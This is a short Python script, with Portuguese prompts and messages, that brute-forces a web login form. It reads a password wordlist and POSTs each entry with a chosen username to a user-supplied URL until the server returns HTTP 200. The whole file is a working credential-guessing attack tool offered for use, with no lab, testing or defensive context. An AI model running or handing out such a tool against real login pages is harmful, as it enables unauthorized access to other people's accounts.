import requests

def brute_force_attack(target_url, username, password_file):
    with open(password_file, "r") as file:
        passwords = file.read().splitlines()

    for password in passwords:
        data = {"username": username, "password": password}
        response = requests.post(target_url, data=data)

        if response.status_code == 200:
            print(f"Senha correta encontrada: {password}")
            return password
        elif response.status_code == 401:
            print(f"Senha incorreta para: {password}")
        else:
            print(f"Erro inesperado: {response.status_code}")

    print("Nenhuma senha válida encontrada.")
    return None

target_url = input('Digite a URL: ')
username = input('Digite o usuário: ')
password_file = input('Digite o nome da wordlist: ')

found_password = brute_force_attack(target_url, username, password_file)

if found_password:
    print(f"A senha correta é: {found_password}")
else:
    print("Nenhuma senha válida encontrada.")